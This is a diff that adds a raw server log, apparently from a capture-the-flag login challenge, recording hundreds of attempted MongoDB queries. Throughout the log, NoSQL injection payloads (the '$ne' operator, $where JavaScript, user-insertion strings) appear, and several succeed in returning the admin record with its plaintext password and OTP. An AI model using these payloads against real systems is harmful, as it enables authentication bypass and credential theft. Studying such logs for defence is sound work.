@@ -1,0 +1,2506 @@
+------------------------
+Running on port 40001
+Query: {'username': u'e', 'auth': {u'otp': u'rrr', u'password': u'retr'}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'0000', u'password': u'guest'}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'0000', u'password': u'guest'}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'1', u'password': u'guest'}}
+None
+Query: {'username': u'\u3141\u3134\u3147\u3139', 'auth': {u'otp': u'111', u'password': u'adsf'}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'1234', u'password': u'guest'}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'', u'password': u'guest'}}
+None
+Query: {'username': u'g', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'', u'password': u'1234'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'1234'}}
+None
+Query: {'username': u'123', 'auth': {u'otp': u'1', u'password': u'123'}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'1', u'password': u'123'}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'1', u'password': u'123'}}
+None
+Query: {'username': u'guest', 'auth': {u'$ne': 1}}
+{u'username': u'guest', u'_id': ObjectId('52cefa94a00b44346514ba6a'), u'email': u'guest@guest.com', u'auth': [{u'OTP': u'123456', u'password': u'guest'}]}
+Query: {'username': u'aaaaaa', 'auth': {u'otp': u'111111', u'password': u'aaaaaaaaa'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'111111', u'password': u'aaaaaaaaa'}}
+None
+Query: {'username': u'admin}', 'auth': {u'otp': u'1', u'password': u'1'}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'1234', u'password': u'guest`'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'Admin', 'auth': {u'otp': u'1111', u'password': u'123123'}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'1234', u'password': u'guest'}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'1234', u'password': u'guest'}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'1234', u'password': u'guest'}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'1234', u'password': u'guest'}}
+None
+Query: {'username': u'app.secret_key', 'auth': {u'otp': u"1'='1", u'password': u'1'}}
+None
+Query: {'username': u'app.secret_keyadad', 'auth': {u'otp': u'd', u'password': u'd'}}
+None
+Query: {'username': u'na', 'auth': {u'otp': u'aa', u'password': u'auth'}}
+None
+Query: {'username': u'qwe', 'auth': {u'otp': u'1', u'password': u'qwe'}}
+None
+Query: {'username': u'qwe', 'auth': {u'$ne': 1}}
+None
+Query: {'username': u'qwe', 'auth': {u'$ne': 1}}
+None
+Query: {'username': u'admin', 'auth': {u'$ne': 1}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'lala', 'auth': {u'otp': u'123', u'password': u'123'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'1', u'password': u'admin'}}
+None
+Query: {'username': u'usernam', 'auth': {u'otp': u'1', u'password': u''}}
+None
+Query: {'username': u'username', 'auth': {u'otp': u'1', u'password': u''}}
+None
+Query: {'username': u'a', 'auth': {u'otp': u'a', u'password': u'a'}}
+None
+Query: {'username': u'a', 'auth': {u'otp': u'a', u'password': u'a'}}
+None
+Query: {'username': u'a', 'auth': {u'otp': u'', u'password': u'a'}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'1', u'password': u'guest'}}
+None
+Query: {'username': u'123', 'auth': {u'otp': u'123', u'password': u'123'}}
+None
+Query: {'username': u'123123123123123123123123', 'auth': {u'otp': u'31 dfasdf123 ', u'password': u'1231231231231231231231231312'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u"1' == '1' OR '1"}}
+None
+Query: {'username': u'123', 'auth': {u'otp': u'123', u'password': u'123'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'asd', u'password': u'asdasd'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'admin'}}
+None
+Query: {'username': u'admin]', 'auth': {u'otp': u'', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'1 or 1=1', u'password': u'admin'}}
+None
+Query: {'username': u']', 'auth': {u'otp': u'', u'password': u']'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'123456'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'password': u'admin', u'otps': u''}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': 1, u'password': 1}}
+None
+Query: {'username': u"admin')}//", 'auth': {u'otp': 1, u'password': 1}}
+None
+Query: {'username': u"admin'})//", 'auth': {u'otp': 1, u'password': 1}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': 1, u'password': 1}}
+None
+Query: {'username': u'1', 'auth': 1}
+None
+Query: {'username': u'admin', 'auth': {u'otp': 1, u'password': 1}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': 1}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': 1}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': 1}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': 1}}
+None
+Query: {'username': u'admin', 'auth': {u'password': 2}}
+None
+Query: {'username': u'a', 'auth': {u'otp': u'a', u'password': u'a'}}
+None
+Query: {'username': u'a', 'auth': {u'otp': u'a', u'password': u'a'}}
+None
+Query: {'username': u'a', 'auth': {u'otp': u'1', u'password': u'a'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'3004'}}
+None
+Query: {'username': u"'", 'auth': {u'otp': u'', u'password': u"'"}}
+None
+Query: {'username': u'', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u"' or '1'='1"}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'admin', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'admin', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'admin', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'admin', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'admin', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'admin', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'admin', u'password': {u'not': u'admin'}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'admin', u'password': {u'$not': u'admin'}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$not': u'admin'}, u'password': {u'$not': u'admin'}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$not': u'admin'}, u'password': {u'$not': u'admin'}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$not': u'admin'}, u'password': {u'$not': u'aadmin'}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$not': u'admin'}, u'password': {u'$not': u'aadmin'}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$not': u'aadmin'}, u'password': {u'$not': u'aadmin'}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$not': u'aadmin'}, u'password': {u'$not': u'aadmin'}}}
+None
+Query: {'username': u'admin', 'auth': {u'$not': u'a'}}
+Query: {'username': u'admin', 'auth': {u'$not': 1}}
+Query: {'username': u'admin', 'auth': {u'$not': 1}}
+Query: {'username': u'admin', 'auth': {u'password': 1}}
+None
+Query: {'username': u'admin', 'auth': {u'password': {u'$not': u'a'}}}
+None
+Query: {'username': u'admin', 'auth': {u'password': {u'$noat': u'a'}}}
+None
+Query: {'username': u'admin', 'auth': {u'password': {u'$not': u'a'}}}
+None
+Query: {'username': u'admin', 'auth': [u'foo', {u'bar': [u'baz', None, 1.0, 2]}]}
+None
+Query: {'username': u'admin', 'auth': {u'password': {u'a': u'a'}}}
+None
+Query: {'username': u'admin', 'auth': {u'password': {u'$in': u'a'}}}
+None
+Query: {'username': u'admin', 'auth': {u'password': u'$not'}}
+None
+Query: {'username': u'admin', 'auth': {u'$ne': u'password'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'password'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'passworda'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'password'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$nae': u'password'}}
+Query: {'username': u'admin', 'auth': {u'$ne': u'password'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'rrr', 'auth': {u'otp': u'3434', u'password': u'rrrr'}}
+None
+Query: {'username': u'longnd', 'auth': {u'otp': u'123', u'password': u'123'}}
+None
+Query: {'username': u'rrr', 'auth': {u'otp': u'3434', u'password': u'rrrr'}}
+None
+Query: {'username': u'eee', 'auth': {u'otp': u'eee', u'password': u'eee'}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'', u'password': u'guest'}}
+None
+Query: {'username': u'a', 'auth': {u'otp': u'a', u'password': u'a'}}
+None
+Query: {'username': u'a', 'auth': {u'otp': u'a', u'password': u'a'}}
+None
+Query: {'username': u'a', 'auth': {u'otp': u'a', u'password': u'a'}}
+None
+Query: {'username': u'a', 'auth': {u'otp': u'a', u'$where': u'this.password=password'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'admin'}}
+None
+Query: {'username': u'a', 'auth': {u'$where': u'this.password=password'}}
+Query: {'username': u'a', 'auth': {u'otp': u'a', u'$where': u'this.password=password'}}
+None
+Query: {'username': u'a', 'auth': {u'$where': u'a'}}
+Query: {'username': u'a', 'auth': {u'otp': u'a', u'$where': u'this.password=password'}}
+None
+Query: {'username': u'a', 'auth': {u'otp': u'a'}}
+None
+Query: {'username': u'a', 'auth': {u'$where': u'a'}}
+Query: {'username': u'a', 'auth': {u'where': u'a'}}
+None
+Query: {'username': u'a', 'auth': {u'$whre': u'a'}}
+Query: {'username': u'a', 'auth': {u'$where': u'a'}}
+Query: {'username': u'qwe', 'auth': {u'otp': u'', u'password': u'qwe'}}
+None
+Query: {'username': u'a', 'auth': {}}
+None
+Query: {'username': u'a', 'auth': {u'otp': u'a', u'password': {u'$where': u'1'}}}
+None
+Query: {'username': u'a', 'auth': {u'otp': {u'$where': u'1'}, u'password': {u'$where': u'1'}}}
+None
+Query: {'username': u'a', 'auth': {u'otp': {u'$where': u'1'}}}
+None
+Query: {'username': u'admin', 'auth': {u'$ne': 1}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'a', 'auth': {u'otp': {u'$where': u"function(){var a =''; for(var key in this) {a=a.concat(key,', ')} new RegExp('['.concat(a))}"}}}
+None
+Query: {'username': u'qwe', 'auth': {u'otp': u'123', u'password': u'asd'}}
+None
+Query: {'username': u'a', 'auth': {u'otp': {u'$where': u"function(){var a =''; for(var key in this) {a=a.concat(key,', ')} new RegExp('['.concat(a))}"}}}
+None
+Query: {'username': u'a', 'auth': {u'otp': {u'$where': u"function(){var a =''; for(var key in this) {a=a.concat(key,', ')} new RegExp('['.concat(a))}"}}}
+None
+Query: {'username': u'a', 'auth': {u'otp': {u'$where': u"function(){var a =''; for(var key in this) {a=a.concat(key,', ')} new RegExp('['.concat(a))}"}}}
+None
+Query: {'username': u'a', 'auth': {u'otp': {u'$where': u"function(){var a =''; for(var key in this) {a=a.concat(key,', ')} new RegExp('['.concat(a))}"}}}
+None
+Query: {'username': u'a', 'auth': {u'otp': {u'$where': u"function(){new RegExp('['.concat(a))}"}}}
+None
+Query: {'username': u'a', 'auth': {u'otp': {u'where': u"function(){new RegExp('['.concat(a))}"}}}
+None
+Query: {'username': u'a', 'auth': {u'otp': {u'$where': u"function(){new RegExp('['.concat(a))}"}}}
+None
+Query: {'username': u'a', 'auth': {u'otp': {u'$not': u"function(){new RegExp('['.concat(a))}"}}}
+None
+Query: {'username': u'a', 'auth': {u'otp': {u'$not': u''}}}
+None
+Query: {'username': u'a', 'auth': {u'otp': {u'$not': u''}, u'password': {u'$not': u''}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$not': u''}, u'password': {u'$not': u''}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$not': u''}, u'password': {u'$not': u''}}}
+None
+Query: {'username': u'admin', 'auth': {u'$where': u"this.text.indexOf('Hello') > 0"}}
+Query: {'username': u'admin', 'auth': {u'$not': u"this.text.indexOf('Hello') > 0"}}
+Query: {'username': u'admin', 'auth': {u'$where': u"this.text.indexOf('Hello') > 0"}}
+Query: {'username': u'admin', 'auth': {u'$where': u"this.text.indexOf('Hello') > 0"}}
+Query: {'username': u'admin', 'auth': {u'$where': u"this.text.indexOf('Hello') > 0"}}
+Query: {'username': u'admin', 'auth': {u'$where': u"this.text.indexOf('Hello') > 0"}}
+Query: {'username': u'admin', 'auth': {u'otp': {u'$where': u"this.text.indexOf('Hello') > 0"}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$not': u"this.text.indexOf('Hello') > 0"}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$not': u''}}}
+None
+Query: {'username': u'dfd', 'auth': {u'otp': u'd', u'password': u'd'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'd', u'password': {u'$in': u'hello'}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$not': u'hello'}, u'password': {u'$not': u'hello'}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'd', u'password': {u'$ne': u'hello'}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'123', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$ne': u'hello'}, u'password': {u'$ne': u'hello'}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$ne': u'hello'}, u'password': {u'$ne': u'hello'}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'123', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'$where': u'this.app_name.length===12'}}
+Query: {'username': u'admin', 'auth': {u'$not': u'this.app_name.length===12'}}
+Query: {'username': u'admin', 'auth': {u'$not': u'1'}}
+Query: {'username': u'admin', 'auth': {u'$ne': u'1'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'1'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'uname', 'auth': {u'otp': u'otp', u'password': u'pass'}}
+None
+Query: {'username': u'uname', 'auth': {u'otp': u'otp or 1=1', u'password': u'pass or 1=1'}}
+None
+Query: {'username': u'uname or 1=1', 'auth': {u'otp': u'otp or 1=1', u'password': u'pass or 1=1'}}
+None
+Query: {'username': u'e`e`', 'auth': {u'otp': u'd', u'password': u'd'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'1', u'password': u'$ne'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'123', u'password': u'asd'}}
+None
+Query: {'username': u'admin', 'auth': {}}
+None
+Query: {'username': u'', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'admin', 'auth': {u'$or': [1, 2]}}
+Query: {'username': u'qwe', 'auth': {u'otp': {u'$regex': u'.*'}, u'password': {u'$regex': u'.*'}}}
+None
+Query: {'username': u'admin', 'auth': {u'$ne': u'1'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'abc', 'auth': {u'otp': u'1', u'password': u'd\xe8'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'123', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'123', u'password': u'admin'}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'1234', u'password': u'guest'}}
+None
+Query: {'username': u"'", 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'"', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'{', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'}', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'\\', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u';', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u"admin' and 1=1 -- -", 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u"admin' or 1=1 -- -", 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'', 'auth': {u'otp': u'123', u'password': u''}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'0x3004', u'password': u'admin'}}
+None
+Query: {'username': u'', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'', 'auth': {u'otp': u'3333333333333333333333333333333333333', u'password': u''}}
+None
+Query: {'username': u"admin';while(1);var foo='bar", 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u"admin';while(1);", 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u"admin';return(true);", 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u"admin';return(true)", 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u"admin';return(true);var foo='bar", 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'dw', 'auth': {u'otp': u'3333333333333333333333333333333333333', u'password': u''}}
+None
+Query: {'username': u"admin';return(false);var foo='bar", 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'77777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777', u'password': u'admin'}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'1234', u'password': u'g\xfaet'}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'1234', u'password': u'guest'}}
+None
+Query: {'username': u'guest', 'auth': {u'password': u'guest'}}
+None
+Query: {'username': u'guest', 'auth': {}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'/.*/', u'password': u'/.*/'}}
+None
+Query: {'username': u'a', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'a', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'sds'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'function() { return this.auth; }'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'function() { return this.auth; }'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'function() { return obj.auth; }'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'admin', 'auth': {u'otp[$ne]': u'1', u'password[$ne]': u'1'}}
+None
+Query: {'username': u'admin}', 'auth': {u'otp': u'1', u'password': u'1'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'function() { sleep (10000); }'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'function() { sleep (10000); }'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'function() { sleep (10000); }'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'function() { sleep (10000); }'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'function() { return this.auth; }'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'huygay'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'function() { return this.auth; }'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'function() { return object.auth; }'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'function() { return object.auth; }'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'function() { return this.auth; }'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'function() { sleep(10000); }'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'function() { sleep(10000); }'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'function() { sleep(10000); }'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'function() { sleep(10000); }'}}
+None
+Query: {'username': u'dsds', 'auth': {u'otp': u'dsds', u'password': u'dsdsd'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'function() { return true3B }'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'this.auth'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'this.auths'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'this.auth'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'this.auth'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'this.auth==this.auth'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'this.auth == this.auth'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'this.credits == this.credits '}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'this.credits == this.credits '}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'this.credits == this.credits '}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'this.credits == this.credits '}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'', u'password': u'guest'}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'1234', u'password': u'guest'}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'1234', u'password': u'guest'}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'1234', u'password': u'guest'}}
+None
+Query: {'username': u'test', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'test', 'auth': {u'otp': u'', u'password': u'12323'}}
+None
+Query: {'username': u'test', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'test', 'auth': {u'username': u'test'}}
+None
+Query: {'username': u'test', 'auth': {u'username': u'test'}}
+None
+Query: {'username': u'test', 'auth': {u'username': u'test'}}
+None
+Query: {'username': u'admin', 'auth': {u'username': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'username': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'username': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'username': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'username': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'password': {u'$ne': 20}}}
+None
+Query: {'username': u'admin', 'auth': {u'password': {u'$ne': 20}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': 1, u'password': {u'$ne': 20}}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'3004', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$ne': 20}, u'password': {u'$ne': 20}}}
+None
+Query: {'username': u'', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'admin', 'auth': {u'otp[$ne]': u'moo', u'password[$ne]': u'moo'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp[ne]': u'moo', u'password[ne]': u'moo'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': {u'$ne': u'moo'}, u'password': {u'$ne': u'moo'}}}
+None
+Query: {'username': u'a', 'auth': {u'otp': u'a', u'password': u'a'}}
+None
+Query: {'username': u'a', 'auth': {u'otp': u'a', u'password': u'a'}}
+None
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'admin', 'auth': {u'$ne': u'moo'}}
+{u'username': u'admin', u'_id': ObjectId('52cefa8fa00b44346514ba69'), u'email': u'admin@admin.com', u'auth': [{u'OTP': u'1337', u'password': u'$up3rP455w0rd!|'}]}
+Query: {'username': u'a', 'auth': {u'otp': u'a', u'password': u'a'}}
+None
+Query: {'username': u'dd', 'auth': {u'otp': u'ee', u'password': u'dd'}}
+None
+Query: {'username': u'admin\u2019});//', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'admin\u2019})}//', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u"'}), db.users.insert({name: 'pen_test', pass: 'pen_test'}), 1 } //", 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u"'}), mongo.db.login.insert({'username': 'pen_test', 'auth': 'pen_test'}), 1 } //", 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'\'}), mongo.db.login.insert({\'username\': \'admin\', \'auth\': {"password":"password", "otp":"otp"}}), 1 } #', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'otp', u'password': u'password'}}
+None
+Query: {'username': u'\'}), mongo.db.login.insert({\'username\': \'admin\', \'auth\': {"password":"password", "otp":"otp"}}) #', 'auth': {u'otp': u'otp', u'password': u'password'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'otp', u'password': u'password'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'11234', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'1', u'password': u'aa'}}
+None
+Query: {'username': u'}) #', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'admin}) #', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'admin\u2019}) #', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u"admin\u2019}) '''", 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'admin\u2019}) #', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'admin};//', 'auth': {u'otp': u'1121', u'password': u'123123'}}
+None
+Query: {'username': u'', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'1234', u'password': u'123456'}}
+None
+Query: {'username': u'', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'/.*/', u'password': u'/.*/'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'/.*/', u'password': u'/.*/'}}
+None
+Query: {'username': u'1', 'auth': {u'otp': u'', u'password': u'1'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'80', u'password': u'12345'}}
+None
+Query: {'username': u"admin' or 1=1-- -", 'auth': {u'otp': u'80', u'password': u'123123'}}
+None
